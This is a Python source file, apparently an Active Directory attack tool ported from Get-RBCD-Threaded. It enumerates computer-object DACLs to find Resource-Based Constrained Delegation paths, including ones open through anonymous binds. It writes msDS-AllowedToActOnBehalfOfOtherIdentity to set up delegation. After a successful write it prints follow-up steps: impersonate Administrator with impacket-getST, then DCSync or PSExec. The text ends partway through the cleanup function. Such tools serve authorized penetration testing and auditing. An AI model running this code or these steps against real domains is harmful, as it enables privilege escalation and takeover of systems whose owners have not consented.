#!/usr/bin/env python3
"""
get-rbcd.py - Python port of Get-RBCD-Threaded by FatRodzianko
https://github.com/FatRodzianko/Get-RBCD-Threaded

Discovers and exploits Resource-Based Constrained Delegation (RBCD) attack paths
in Active Directory.

Enumerates users, groups, and computer objects, then checks DACLs on computer objects
for principals with GenericAll, GenericWrite, WriteOwner, WriteDacl, or WriteProp
(on msDS-AllowedToActOnBehalfOfOtherIdentity) permissions.

Can also write/clear msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD exploitation
and cleanup, including via anonymous/null LDAP sessions.

Enhancements over original:
  - Pure Python (ldap3) - runs natively on Kali Linux, no impacket required
  - Anonymous / Guest / null-session LDAP bind support
  - Checks write permissions on the DC computer object itself
  - RBCD write and cleanup functionality (--write-rbcd / --clear-rbcd)
  - Kerberos authentication support
  - Concurrent ACL processing with ThreadPoolExecutor
  - JSON output option alongside CSV
  - Color-coded terminal output

Author: Mitchell (ported from C# by FatRodzianko)
"""

import argparse
import csv
import json
import sys
import time
import struct
import re
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict, field
from typing import Optional

try:
    import ldap3
    from ldap3 import Server, Connection, ALL, NTLM, SASL, KERBEROS, ANONYMOUS, SIMPLE
    from ldap3 import ALL_ATTRIBUTES, ALL_OPERATIONAL_ATTRIBUTES
    from ldap3.utils.conv import escape_filter_chars
except ImportError:
    print("[!] ldap3 is required: pip install ldap3")
    sys.exit(1)


# =============================================================================
# Constants
# =============================================================================

# GUID for msDS-AllowedToActOnBehalfOfOtherIdentity property
RBCD_GUID = "3f78c3e5-f79a-46bd-a0b8-9d18116ddc79"

# Active Directory Rights bit flags (from System.DirectoryServices.ActiveDirectoryRights)
ADS_RIGHT_GENERIC_ALL     = 0x10000000  # GenericAll
ADS_RIGHT_GENERIC_WRITE   = 0x40000000  # GenericWrite
ADS_RIGHT_WRITE_OWNER     = 0x00080000  # WriteOwner
ADS_RIGHT_WRITE_DACL      = 0x00040000  # WriteDacl
ADS_RIGHT_DS_WRITE_PROP   = 0x00000020  # WriteProperty

# ACE type constants
ACCESS_ALLOWED_ACE_TYPE              = 0x00
ACCESS_ALLOWED_OBJECT_ACE_TYPE       = 0x05

# ACE flag for object type present
ACE_OBJECT_TYPE_PRESENT = 0x01

# Privileged groups to exclude (same as original C#)
PRIVILEGED_GROUPS = {
    "Domain Admins",
    "Account Operators",
    "Enterprise Admins",
    "Administrators",
    "DnsAdmins",
    "Schema Admins",
    "Key Admins",
    "Enterprise Key Admins",
    "Storage Replica Administrators",
    "BUILTIN\\Administrators",
}

# samAccountType values
SAM_USER_OBJECT     = 805306368
SAM_COMPUTER_OBJECT = 805306369


# =============================================================================
# Colors
# =============================================================================

class Colors:
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    BOLD    = "\033[1m"
    RESET   = "\033[0m"


def cprint(msg, color=Colors.RESET):
    print(f"{color}{msg}{Colors.RESET}")


def build_sd_control(sdflags=0x04):
    """
    Build the LDAP_SERVER_SD_FLAGS_OID control as a tuple.
    sdflags: 0x01=Owner, 0x02=Group, 0x04=DACL, 0x08=SACL
    Returns a tuple (oid, criticality, value) compatible with ldap3.
    """
    # BER encode: SEQUENCE { INTEGER sdflags }
    # For sdflags <= 127, single byte encoding works
    value = bytes([0x30, 0x03, 0x02, 0x01, sdflags & 0xFF])
    return ('1.2.840.113556.1.4.801', True, value)


# =============================================================================
# Data classes
# =============================================================================

@dataclass
class SidMapping:
    """Maps an objectSID to its sAMAccountName and domain."""
    object_sid: str
    sam_account_name: str
    domain_name: str


@dataclass
class RBCDResult:
    """Represents a discovered RBCD attack path."""
    source: str              # Principal with write access
    source_sid: str          # SID of the source principal
    source_domain: str       # Domain of the source principal
    destination: str         # Target computer (dNSHostName or sAMAccountName)
    destination_dn: str      # Distinguished name of the target
    privilege: str           # GenericAll, GenericWrite, WriteOwner, WriteDacl, WriteProp
    is_dc: bool = False      # Whether the destination is a Domain Controller


# =============================================================================
# Security Descriptor Parsing
# =============================================================================

def parse_sid(data: bytes, offset: int = 0) -> str:
    """Parse a binary SID into string format S-1-..."""
    if len(data) - offset < 8:
        return ""
    revision = data[offset]
    sub_authority_count = data[offset + 1]
    authority = int.from_bytes(data[offset + 2:offset + 8], byteorder='big')

    sids = [f"S-{revision}-{authority}"]
    for i in range(sub_authority_count):
        sub_offset = offset + 8 + (i * 4)
        if sub_offset + 4 > len(data):
            break
        sub_auth = struct.unpack('<I', data[sub_offset:sub_offset + 4])[0]
        sids.append(str(sub_auth))

    return "-".join(sids)


def sid_length(data: bytes, offset: int = 0) -> int:
    """Calculate the byte length of a SID at the given offset."""
    if len(data) - offset < 2:
        return 0
    sub_authority_count = data[offset + 1]
    return 8 + (sub_authority_count * 4)


def sid_to_bytes(sid_string: str) -> bytes:
    """Convert a SID string (S-1-5-21-...) to binary format."""
    parts = sid_string.split('-')
    revision = int(parts[1])
    authority = int(parts[2])
    sub_authorities = [int(x) for x in parts[3:]]

    sid_bytes = struct.pack('BB', revision, len(sub_authorities))
    sid_bytes += authority.to_bytes(6, byteorder='big')
    for sa in sub_authorities:
        sid_bytes += struct.pack('<I', sa)

    return sid_bytes


def build_rbcd_sd(delegate_from_sid: str) -> bytes:
    """
    Build a self-relative security descriptor that allows the given SID
    to act on behalf of another identity (RBCD).

    This constructs the binary value for msDS-AllowedToActOnBehalfOfOtherIdentity.
    Equivalent to what bloodyAD / impacket rbcd.py builds.
    """
    sid_bytes = sid_to_bytes(delegate_from_sid)

    # Build ACE: ACCESS_ALLOWED_ACE_TYPE
    # AceType(1) + AceFlags(1) + AceSize(2) + AccessMask(4) + SID(variable)
    access_mask = 0x000F01FF  # 983551 - Full control for RBCD
    ace_body = struct.pack('<I', access_mask) + sid_bytes
    ace_size = 4 + len(ace_body)  # header(4) + body
    ace = struct.pack('<BBH', 0x00, 0x00, ace_size) + ace_body  # ACE_TYPE=0, FLAGS=0

    # Build ACL (DACL)
    # AclRevision(1) + Sbz1(1) + AclSize(2) + AceCount(2) + Sbz2(2) + ACEs
    acl_size = 8 + len(ace)
    dacl = struct.pack('<BBHHH', 0x02, 0x00, acl_size, 1, 0x00) + ace

    # Owner SID: S-1-0-0 (NULL SID)
    owner_sid = sid_to_bytes("S-1-0-0")

    # Build self-relative Security Descriptor
    # Revision(1) + Sbz1(1) + Control(2) + OffsetOwner(4) + OffsetGroup(4) +
    # OffsetSacl(4) + OffsetDacl(4) = 20 bytes header
    sd_header_size = 20
    offset_owner = sd_header_size
    offset_dacl = offset_owner + len(owner_sid)
    offset_group = 0   # No group
    offset_sacl = 0     # No SACL

    # Control: SE_DACL_PRESENT (0x0004) | SE_SELF_RELATIVE (0x8000) = 0x8004
    control = 0x8004

    sd = struct.pack('<BBH', 0x01, 0x00, control)
    sd += struct.pack('<IIII', offset_owner, offset_group, offset_sacl, offset_dacl)
    sd += owner_sid
    sd += dacl

    return sd


def parse_guid(data: bytes) -> str:
    """Parse 16 bytes into a GUID string."""
    if len(data) < 16:
        return ""
    # GUID is stored as: Data1 (LE 4B), Data2 (LE 2B), Data3 (LE 2B), Data4 (8B)
    d1 = struct.unpack('<I', data[0:4])[0]
    d2 = struct.unpack('<H', data[4:6])[0]
    d3 = struct.unpack('<H', data[6:8])[0]
    d4 = data[8:16]
    return f"{d1:08x}-{d2:04x}-{d3:04x}-{d4[0]:02x}{d4[1]:02x}-{d4[2]:02x}{d4[3]:02x}{d4[4]:02x}{d4[5]:02x}{d4[6]:02x}{d4[7]:02x}"


def parse_acl(data: bytes):
    """
    Parse a binary ACL (DACL) and yield ACE entries.
    Each yielded ACE is a dict with keys:
      - ace_type, ace_flags, access_mask, sid, object_type_guid (if applicable)
    """
    if len(data) < 8:
        return

    # ACL Header: revision(1), sbz1(1), acl_size(2), ace_count(2), sbz2(2)
    acl_revision = data[0]
    acl_size = struct.unpack('<H', data[2:4])[0]
    ace_count = struct.unpack('<H', data[4:6])[0]

    offset = 8  # Start of first ACE

    for _ in range(ace_count):
        if offset + 4 > len(data):
            break

        ace_type = data[offset]
        ace_flags = data[offset + 1]
        ace_size = struct.unpack('<H', data[offset + 2:offset + 4])[0]

        if ace_size < 4 or offset + ace_size > len(data):
            break

        ace_data = data[offset:offset + ace_size]

        if ace_type == ACCESS_ALLOWED_ACE_TYPE:
            # Standard ACE: ace_header(4) + access_mask(4) + SID
            if len(ace_data) >= 8:
                access_mask = struct.unpack('<I', ace_data[4:8])[0]
                sid = parse_sid(ace_data, 8)
                yield {
                    "ace_type": ace_type,
                    "ace_flags": ace_flags,
                    "access_mask": access_mask,
                    "sid": sid,
                    "object_type_guid": None,
                }

        elif ace_type == ACCESS_ALLOWED_OBJECT_ACE_TYPE:
            # Object ACE: ace_header(4) + access_mask(4) + flags(4) + [objectType(16)] + [inheritedObjectType(16)] + SID
            if len(ace_data) >= 12:
                access_mask = struct.unpack('<I', ace_data[4:8])[0]
                obj_flags = struct.unpack('<I', ace_data[8:12])[0]

                guid_offset = 12
                object_type_guid = None
                inherited_object_type_guid = None

                if obj_flags & ACE_OBJECT_TYPE_PRESENT:
                    if guid_offset + 16 <= len(ace_data):
                        object_type_guid = parse_guid(ace_data[guid_offset:guid_offset + 16])
                        guid_offset += 16

                if obj_flags & 0x02:  # Inherited object type present
                    if guid_offset + 16 <= len(ace_data):
                        inherited_object_type_guid = parse_guid(ace_data[guid_offset:guid_offset + 16])
                        guid_offset += 16

                sid = parse_sid(ace_data, guid_offset)

                yield {
                    "ace_type": ace_type,
                    "ace_flags": ace_flags,
                    "access_mask": access_mask,
                    "sid": sid,
                    "object_type_guid": object_type_guid,
                }

        offset += ace_size


def parse_security_descriptor(raw_sd: bytes):
    """
    Parse a raw ntSecurityDescriptor binary blob.
    Returns a list of ACE dicts from the DACL.
    """
    if len(raw_sd) < 20:
        return []

    # SD Header: revision(1), sbz1(1), control(2), owner_offset(4), group_offset(4),
    #            sacl_offset(4), dacl_offset(4)
    dacl_offset = struct.unpack('<I', raw_sd[16:20])[0]

    if dacl_offset == 0 or dacl_offset >= len(raw_sd):
        return []

    aces = list(parse_acl(raw_sd[dacl_offset:]))
    return aces


# =============================================================================
# LDAP Helpers
# =============================================================================

def create_connection(args) -> tuple:
    """Create and return (Connection, base_dn) based on CLI args."""
    dc_host = args.dc_ip or args.domain

    use_ssl = not args.insecure
    port = 636 if use_ssl else 389

    server = Server(dc_host, port=port, use_ssl=use_ssl, get_info=ALL,
                    connect_timeout=10)

    # Build base DN from domain
    base_dn = ",".join([f"DC={part}" for part in args.domain.split(".")])

    if args.anonymous:
        cprint(f"[*] Attempting anonymous bind to {dc_host}:{port}", Colors.YELLOW)
        conn = Connection(server, authentication=ANONYMOUS)
        if not conn.bind():
            raise Exception(f"Anonymous bind failed: {conn.result}")
    elif args.username and args.password:
        if args.kerberos:
            cprint(f"[*] Attempting Kerberos auth to {dc_host}:{port} as {args.username}", Colors.YELLOW)
            conn = Connection(server, user=args.username, password=args.password,
                              authentication=SASL, sasl_mechanism=KERBEROS)
            if not conn.bind():
                raise Exception(f"Kerberos bind failed: {conn.result}")
        else:
            # Always use DOMAIN\user format for NTLM
            if "\\" in args.username:
                ntlm_user = args.username
            elif "@" in args.username:
                # Convert user@domain to DOMAIN\user
                parts = args.username.split("@")
                ntlm_user = f"{parts[1]}\\{parts[0]}"
            else:
                ntlm_user = f"{args.domain}\\{args.username}"

            cprint(f"[*] Attempting NTLM auth to {dc_host}:{port} as {ntlm_user}", Colors.YELLOW)
            conn = Connection(server, user=ntlm_user, password=args.password,
                              authentication=NTLM)
            if not conn.bind():
                # Fallback: try SIMPLE bind with user@domain format
                cprint(f"[*] NTLM failed, trying SIMPLE bind...", Colors.YELLOW)
                if "@" in args.username:
                    simple_user = args.username
                else:
                    simple_user = f"{args.username}@{args.domain}"
                conn = Connection(server, user=simple_user, password=args.password,
                                  authentication=SIMPLE)
                if not conn.bind():
                    raise Exception(f"All bind attempts failed. Last result: {conn.result}")
    else:
        # Try anonymous as fallback
        cprint(f"[*] No credentials supplied, attempting anonymous bind to {dc_host}:{port}", Colors.YELLOW)
        conn = Connection(server, authentication=ANONYMOUS)
        if not conn.bind():
            raise Exception(f"Anonymous bind failed: {conn.result}")

    cprint(f"[+] Successfully bound to {dc_host}:{port}", Colors.GREEN)
    cprint(f"[*] Base DN: {base_dn}", Colors.CYAN)

    return conn, base_dn


def paged_search(conn, base_dn, search_filter, attributes, controls=None):
    """Perform a paged LDAP search and return all entries."""
    results = []
    paged_size = 1000

    try:
        entry_generator = conn.extend.standard.paged_search(
            search_base=base_dn,
            search_filter=search_filter,
            search_scope=ldap3.SUBTREE,
            attributes=attributes,
            controls=controls,
            paged_size=paged_size,
            generator=True,
        )

        for entry in entry_generator:
            if entry.get("type") == "searchResEntry":
                results.append(entry)
    except Exception as e:
        # If paged_search with controls fails, fall back to regular search with paging
        cprint(f"[*] Paged search with controls failed ({e}), trying fallback...", Colors.YELLOW)
        cookie = None
        while True:
            conn.search(
                search_base=base_dn,
                search_filter=search_filter,
                search_scope=ldap3.SUBTREE,
                attributes=attributes,
                controls=controls,
                paged_size=paged_size,
                paged_cookie=cookie,
            )
            for entry in conn.response:
                if entry.get("type") == "searchResEntry":
                    results.append(entry)

            # Check for paging cookie
            cookie = conn.result.get("controls", {}).get("1.2.840.113556.1.4.319", {}).get("value", {}).get("cookie")
            if not cookie:
                break

    return results


# =============================================================================
# Enumeration Functions
# =============================================================================

def get_users(conn, base_dn, domain) -> tuple:
    """Query all user objects and return (sid_list, sid_map_list)."""
    cprint(f"\n[*] Enumerating users in {domain}...", Colors.CYAN)
    search_filter = "(samAccountType=805306368)"
    attributes = ["objectSid", "sAMAccountName"]

    entries = paged_search(conn, base_dn, search_filter, attributes)

    sid_list = []
    sid_map_list = []
    for entry in entries:
        attrs = entry.get("attributes", {})
        raw_sid = attrs.get("objectSid")
        sam = attrs.get("sAMAccountName", "")

        if raw_sid:
            if isinstance(raw_sid, bytes):
                sid_str = parse_sid(raw_sid)
            else:
                sid_str = str(raw_sid)

            sid_list.append(sid_str)
            sid_map_list.append(SidMapping(sid_str, str(sam), domain))

    cprint(f"[+] Found {len(sid_list)} users in {domain}", Colors.GREEN)
    return sid_list, sid_map_list


def get_groups(conn, base_dn, domain) -> tuple:
    """Query all group objects (excluding privileged groups) and return (sid_list, sid_map_list)."""
    cprint(f"[*] Enumerating groups in {domain}...", Colors.CYAN)
    search_filter = "(objectCategory=group)"
    attributes = ["objectSid", "sAMAccountName"]

    entries = paged_search(conn, base_dn, search_filter, attributes)

    sid_list = []
    sid_map_list = []
    for entry in entries:
        attrs = entry.get("attributes", {})
        sam = str(attrs.get("sAMAccountName", ""))
        raw_sid = attrs.get("objectSid")

        # Filter out privileged groups (same as original C#)
        if sam in PRIVILEGED_GROUPS:
            continue

        if raw_sid:
            if isinstance(raw_sid, bytes):
                sid_str = parse_sid(raw_sid)
            else:
                sid_str = str(raw_sid)

            sid_list.append(sid_str)
            sid_map_list.append(SidMapping(sid_str, sam, domain))

    cprint(f"[+] Found {len(sid_list)} non-privileged groups in {domain}", Colors.GREEN)
    return sid_list, sid_map_list


def get_computers(conn, base_dn, domain, pwd_last_set_days=0) -> tuple:
    """
    Query all computer objects with their security descriptors.
    Returns (sid_list, sid_map_list, computer_entries_with_sd).
    """
    cprint(f"[*] Enumerating computers in {domain}...", Colors.CYAN)

    if pwd_last_set_days > 0:
        # Windows FILETIME: 100-nanosecond intervals since 1601-01-01
        cutoff = datetime.now() - timedelta(days=pwd_last_set_days)
        # Convert to Windows FILETIME
        epoch = datetime(1601, 1, 1)
        filetime = int((cutoff - epoch).total_seconds() * 10_000_000)
        search_filter = f"(&(samAccountType=805306369)(pwdLastSet>={filetime}))"
        cprint(f"[*] Filtering computers with pwdLastSet within {pwd_last_set_days} days", Colors.YELLOW)
    else:
        search_filter = "(samAccountType=805306369)"

    attributes = ["sAMAccountName", "nTSecurityDescriptor", "objectSid", "dNSHostName",
                  "distinguishedName", "userAccountControl"]

    # Request the DACL in the security descriptor
    sd_control = build_sd_control(sdflags=0x04)  # DACL only

    entries = paged_search(conn, base_dn, search_filter, attributes, controls=[sd_control])

    sid_list = []
    sid_map_list = []
    computer_entries = []

    for entry in entries:
        attrs = entry.get("attributes", {})
        raw_sid = attrs.get("objectSid")
        sam = str(attrs.get("sAMAccountName", ""))

        if raw_sid:
            if isinstance(raw_sid, bytes):
                sid_str = parse_sid(raw_sid)
            else:
                sid_str = str(raw_sid)

            sid_list.append(sid_str)
            sid_map_list.append(SidMapping(sid_str, sam, domain))

        # Check if this is a DC via userAccountControl
        uac = attrs.get("userAccountControl", 0)
        if isinstance(uac, list):
            uac = uac[0] if uac else 0
        is_dc = bool(int(uac) & 0x2000)  # SERVER_TRUST_ACCOUNT

        computer_entries.append({
            "attrs": attrs,
            "sid": sid_str if raw_sid else "",
            "is_dc": is_dc,
        })

    cprint(f"[+] Found {len(computer_entries)} computers in {domain}", Colors.GREEN)
    dc_count = sum(1 for c in computer_entries if c["is_dc"])
    if dc_count:
        cprint(f"[!] {dc_count} of these are Domain Controllers", Colors.MAGENTA)

    return sid_list, sid_map_list, computer_entries


# =============================================================================
# ACL Analysis
# =============================================================================

def check_rbcd_aces(computer_entry, all_sids_set, sid_map_dict) -> list:
    """
    Parse the ntSecurityDescriptor of a computer object and check for RBCD-relevant ACEs.
    Returns a list of RBCDResult for any matches found.
    """
    results = []
    attrs = computer_entry["attrs"]
    computer_sid = computer_entry["sid"]
    is_dc = computer_entry["is_dc"]

    raw_sd = attrs.get("nTSecurityDescriptor")
    if not raw_sd:
        return results

    if isinstance(raw_sd, bytes):
        sd_bytes = raw_sd
    elif isinstance(raw_sd, list) and raw_sd:
        sd_bytes = raw_sd[0] if isinstance(raw_sd[0], bytes) else raw_sd
    else:
        return results

    # Get hostname for display
    hostname = attrs.get("dNSHostName", "")
    if isinstance(hostname, list):
        hostname = hostname[0] if hostname else ""
    hostname = str(hostname)
    if not hostname:
        hostname = str(attrs.get("sAMAccountName", "UNKNOWN"))

    dn = attrs.get("distinguishedName", "")
    if isinstance(dn, list):
        dn = str(dn[0]) if dn else ""
    else:
        dn = str(dn)

    # Parse the security descriptor
    aces = parse_security_descriptor(sd_bytes)

    for ace in aces:
        sid = ace["sid"]
        access_mask = ace["access_mask"]
        obj_guid = ace.get("object_type_guid")

        # Skip if the SID is the computer itself
        if sid == computer_sid:
            continue

        # Check if the SID is in our enumerated list
        if sid not in all_sids_set:
            continue

        # Determine the privilege
        privilege = None

        if access_mask & ADS_RIGHT_GENERIC_ALL:
            privilege = "GenericAll"
        elif access_mask & ADS_RIGHT_GENERIC_WRITE:
            privilege = "GenericWrite"
        elif access_mask & ADS_RIGHT_WRITE_OWNER:
            privilege = "WriteOwner"
        elif access_mask & ADS_RIGHT_WRITE_DACL:
            privilege = "WriteDacl"
        elif access_mask & ADS_RIGHT_DS_WRITE_PROP:
            # Check if it's specifically for msDS-AllowedToActOnBehalfOfOtherIdentity
            if obj_guid and obj_guid.lower() == RBCD_GUID:
                privilege = "WriteProp (msDS-AllowedToActOnBehalfOfOtherIdentity)"
            elif obj_guid is None:
                # WriteProperty with no specific object type = write all properties
                privilege = "WriteAllProperties"

        if privilege:
            mapping = sid_map_dict.get(sid)
            source_name = mapping.sam_account_name if mapping else sid
            source_domain = mapping.domain_name if mapping else "UNKNOWN"

            results.append(RBCDResult(
                source=source_name,
                source_sid=sid,
                source_domain=source_domain,
                destination=hostname,
                destination_dn=dn,
                privilege=privilege,
                is_dc=is_dc,
            ))

    return results


def check_anonymous_rbcd(args, base_dn):
    """
    Bonus check: attempt anonymous/guest LDAP bind and check if we can
    write msDS-AllowedToActOnBehalfOfOtherIdentity on any computer object.
    This is the exact scenario from Operation Endgame.
    """
    cprint(f"\n{'='*70}", Colors.MAGENTA)
    cprint("[*] BONUS: Checking anonymous/guest write access on computer objects...", Colors.MAGENTA)
    cprint(f"{'='*70}", Colors.MAGENTA)

    dc_host = args.dc_ip or args.domain
    port = 389  # anonymous usually needs plaintext

    try:
        server = Server(dc_host, port=port, use_ssl=False, get_info=ALL, connect_timeout=10)
        anon_conn = Connection(server, authentication=ANONYMOUS)
        if not anon_conn.bind():
            cprint(f"[-] Anonymous bind failed: {anon_conn.result}", Colors.RED)
            return []
        cprint("[+] Anonymous bind successful", Colors.GREEN)
    except Exception as e:
        cprint(f"[-] Anonymous bind failed: {e}", Colors.RED)
        return []

    # Search for computer objects - get their SDs
    search_filter = "(samAccountType=805306369)"
    attributes = ["sAMAccountName", "nTSecurityDescriptor", "objectSid", "dNSHostName",
                  "distinguishedName", "userAccountControl"]

    sd_control = build_sd_control(sdflags=0x04)

    results = []
    try:
        entries = paged_search(anon_conn, base_dn, search_filter, attributes, controls=[sd_control])
        cprint(f"[*] Retrieved {len(entries)} computer objects via anonymous bind", Colors.CYAN)

        # Well-known anonymous/everyone SIDs
        anon_sids = {
            "S-1-1-0",       # Everyone
            "S-1-5-7",       # Anonymous Logon
            "S-1-5-11",      # Authenticated Users
        }

        for entry in entries:
            attrs = entry.get("attributes", {})
            raw_sd = attrs.get("nTSecurityDescriptor")
            if not raw_sd:
                continue

            if isinstance(raw_sd, bytes):
                sd_bytes = raw_sd
            elif isinstance(raw_sd, list) and raw_sd:
                sd_bytes = raw_sd[0] if isinstance(raw_sd[0], bytes) else raw_sd
            else:
                continue

            hostname = attrs.get("dNSHostName", attrs.get("sAMAccountName", "UNKNOWN"))
            if isinstance(hostname, list):
                hostname = str(hostname[0]) if hostname else "UNKNOWN"
            else:
                hostname = str(hostname) if hostname else "UNKNOWN"

            dn = attrs.get("distinguishedName", "")
            if isinstance(dn, list):
                dn = str(dn[0]) if dn else ""
            else:
                dn = str(dn)

            uac = attrs.get("userAccountControl", 0)
            if isinstance(uac, list):
                uac = uac[0] if uac else 0
            is_dc = bool(int(uac) & 0x2000)

            computer_sid_raw = attrs.get("objectSid")
            computer_sid = ""
            if computer_sid_raw:
                if isinstance(computer_sid_raw, bytes):
                    computer_sid = parse_sid(computer_sid_raw)
                else:
                    computer_sid = str(computer_sid_raw)

            aces = parse_security_descriptor(sd_bytes)

            for ace in aces:
                sid = ace["sid"]
                access_mask = ace["access_mask"]
                obj_guid = ace.get("object_type_guid")

                if sid not in anon_sids:
                    continue

                # Map the well-known SID to a name
                sid_names = {
                    "S-1-1-0": "Everyone",
                    "S-1-5-7": "ANONYMOUS LOGON",
                    "S-1-5-11": "Authenticated Users",
                }
                source_name = sid_names.get(sid, sid)

                privilege = None
                if access_mask & ADS_RIGHT_GENERIC_ALL:
                    privilege = "GenericAll"
                elif access_mask & ADS_RIGHT_GENERIC_WRITE:
                    privilege = "GenericWrite"
                elif access_mask & ADS_RIGHT_WRITE_OWNER:
                    privilege = "WriteOwner"
                elif access_mask & ADS_RIGHT_WRITE_DACL:
                    privilege = "WriteDacl"
                elif access_mask & ADS_RIGHT_DS_WRITE_PROP:
                    if obj_guid and obj_guid.lower() == RBCD_GUID:
                        privilege = "WriteProp (msDS-AllowedToActOnBehalfOfOtherIdentity)"
                    elif obj_guid is None:
                        privilege = "WriteAllProperties"

                if privilege:
                    results.append(RBCDResult(
                        source=source_name,
                        source_sid=sid,
                        source_domain="WELL-KNOWN",
                        destination=hostname,
                        destination_dn=dn,
                        privilege=privilege,
                        is_dc=is_dc,
                    ))

    except Exception as e:
        cprint(f"[-] Error during anonymous enumeration: {e}", Colors.RED)
    finally:
        try:
            anon_conn.unbind()
        except:
            pass

    if results:
        cprint(f"\n[!!!] CRITICAL: Found {len(results)} anonymous/guest writable computer objects!", Colors.RED)
        for r in results:
            dc_tag = " [DOMAIN CONTROLLER]" if r.is_dc else ""
            cprint(f"  {r.source} -> {r.destination}{dc_tag} ({r.privilege})", Colors.RED)
    else:
        cprint("[-] No anonymous/guest write access found on computer objects", Colors.YELLOW)

    return results


# =============================================================================
# RBCD Write / Clear Operations
# =============================================================================

def resolve_sid(conn, base_dn, identifier, domain) -> str:
    """
    Resolve a sAMAccountName or DN to a SID string.
    If identifier already looks like a SID (S-1-...), return it directly.
    """
    if identifier.upper().startswith("S-1-"):
        return identifier

    # Try by sAMAccountName
    search_filter = f"(sAMAccountName={escape_filter_chars(identifier)})"
    conn.search(base_dn, search_filter, attributes=["objectSid"], search_scope=ldap3.SUBTREE)

    if conn.entries:
        raw_sid = conn.entries[0]["objectSid"].raw_values[0]
        if isinstance(raw_sid, bytes):
            return parse_sid(raw_sid)
        return str(raw_sid)

    cprint(f"[!] Could not resolve '{identifier}' to a SID", Colors.RED)
    return None


def resolve_target_dn(conn, base_dn, target) -> str:
    """
    Resolve a target computer to its DN.
    Accepts: DN, sAMAccountName, or dNSHostName.
    """
    # If it looks like a DN already
    if target.upper().startswith("CN="):
        return target

    # Try sAMAccountName (with or without trailing $)
    sam = target if target.endswith("$") else f"{target}$"
    search_filter = f"(&(samAccountType=805306369)(|(sAMAccountName={escape_filter_chars(sam)})(dNSHostName={escape_filter_chars(target)})))"
    conn.search(base_dn, search_filter, attributes=["distinguishedName"], search_scope=ldap3.SUBTREE)

    if conn.entries:
        dn = conn.entries[0]["distinguishedName"].value
        return str(dn)

    cprint(f"[!] Could not resolve target '{target}' to a DN", Colors.RED)
    return None


def write_rbcd(args, base_dn):
    """
    Write msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer object.
    This configures RBCD delegation from the specified principal.
    """
    cprint(f"\n{'='*70}", Colors.RED)
    cprint("[*] RBCD WRITE MODE - Modifying Active Directory", Colors.RED)
    cprint(f"{'='*70}\n", Colors.RED)

    dc_host = args.dc_ip or args.domain
    use_ssl = not args.insecure
    port = 636 if use_ssl else 389

    server = Server(dc_host, port=port, use_ssl=use_ssl, get_info=ALL, connect_timeout=10)

    # Establish connection based on auth method
    if args.anonymous or (not args.username and not args.password):
        cprint(f"[*] Using anonymous bind for RBCD write to {dc_host}:{port}", Colors.YELLOW)
        conn = Connection(server, authentication=ANONYMOUS)
    elif args.username and args.password:
        if "\\" in args.username:
            ntlm_user = args.username
        else:
            ntlm_user = f"{args.domain}\\{args.username}"
        cprint(f"[*] Using NTLM auth as {ntlm_user} for RBCD write", Colors.YELLOW)
        conn = Connection(server, user=ntlm_user, password=args.password, authentication=NTLM)
    else:
        cprint("[!] No valid auth method for write operation", Colors.RED)
        return False

    if not conn.bind():
        cprint(f"[!] Bind failed: {conn.result}", Colors.RED)
        return False

    cprint(f"[+] Bind successful", Colors.GREEN)

    # Resolve the delegate-from SID
    delegate_sid = resolve_sid(conn, base_dn, args.delegate_from, args.domain)
    if not delegate_sid:
        cprint("[!] Cannot proceed without a valid delegate-from SID", Colors.RED)
        conn.unbind()
        return False
    cprint(f"[+] Delegate-from SID: {delegate_sid}", Colors.GREEN)

    # Resolve target DN
    target_dn = resolve_target_dn(conn, base_dn, args.target)
    if not target_dn:
        cprint("[!] Cannot proceed without a valid target DN", Colors.RED)
        conn.unbind()
        return False
    cprint(f"[+] Target DN: {target_dn}", Colors.GREEN)

    # Build the security descriptor
    sd_bytes = build_rbcd_sd(delegate_sid)
    cprint(f"[*] Built security descriptor ({len(sd_bytes)} bytes)", Colors.CYAN)

    # Write it
    cprint(f"[*] Writing msDS-AllowedToActOnBehalfOfOtherIdentity...", Colors.YELLOW)
    result = conn.modify(
        target_dn,
        {'msDS-AllowedToActOnBehalfOfOtherIdentity': [(ldap3.MODIFY_REPLACE, [sd_bytes])]}
    )

    if result:
        cprint(f"[+] SUCCESS! RBCD delegation configured.", Colors.GREEN)
        cprint(f"[+] {args.delegate_from} ({delegate_sid}) can now delegate to {target_dn}", Colors.GREEN)

        # Resolve the target hostname for the SPN (not the DN)
        target_hostname = None
        search_filter = f"(distinguishedName={escape_filter_chars(target_dn)})"
        conn.search(base_dn, search_filter, attributes=["dNSHostName", "sAMAccountName"], search_scope=ldap3.SUBTREE)
        if conn.entries:
            target_hostname = str(conn.entries[0]["dNSHostName"].value or "")
            if not target_hostname:
                sam = str(conn.entries[0]["sAMAccountName"].value or "")
                target_hostname = sam.rstrip("$") + "." + args.domain

        if not target_hostname:
            # Fallback: try to extract hostname from DN
            import re
            cn_match = re.match(r'CN=([^,]+)', target_dn, re.IGNORECASE)
            target_hostname = (cn_match.group(1) + "." + args.domain) if cn_match else args.target

        cprint(f"\n[*] Next steps:", Colors.CYAN)
        cprint(f"  1. Get a service ticket via S4U2Self + S4U2Proxy:", Colors.CYAN)
        cprint(f"     impacket-getST '{args.domain}/{args.delegate_from}:<PASSWORD>' \\", Colors.CYAN)
        cprint(f"       -spn cifs/{target_hostname} \\", Colors.CYAN)
        cprint(f"       -impersonate Administrator -dc-ip {dc_host}", Colors.CYAN)
        cprint(f"  2. Export and use the ticket:", Colors.CYAN)
        cprint(f"     export KRB5CCNAME=Administrator@cifs_{target_hostname}@{args.domain.upper()}.ccache", Colors.CYAN)
        cprint(f"  3. DCSync or PSExec with the ticket", Colors.CYAN)
        cprint(f"\n[!] REMEMBER to clean up with --clear-rbcd when done!", Colors.RED)
    else:
        cprint(f"[!] FAILED to write RBCD: {conn.result}", Colors.RED)

    conn.unbind()
    return result


def clear_rbcd(args, base_dn):
    """
    Clear msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer object.
    Removes the RBCD configuration (cleanup after exploitation).
    """
    cprint(f"\n{'='*70}", Colors.MAGENTA)
    cprint("[*] RBCD CLEANUP MODE - Removing delegation", Colors.MAGENTA)
    cprint(f"{'='*70}\n", Colors.MAGENTA)

    dc_host = args.dc_ip or args.domain
    use_ssl = not args.insecure
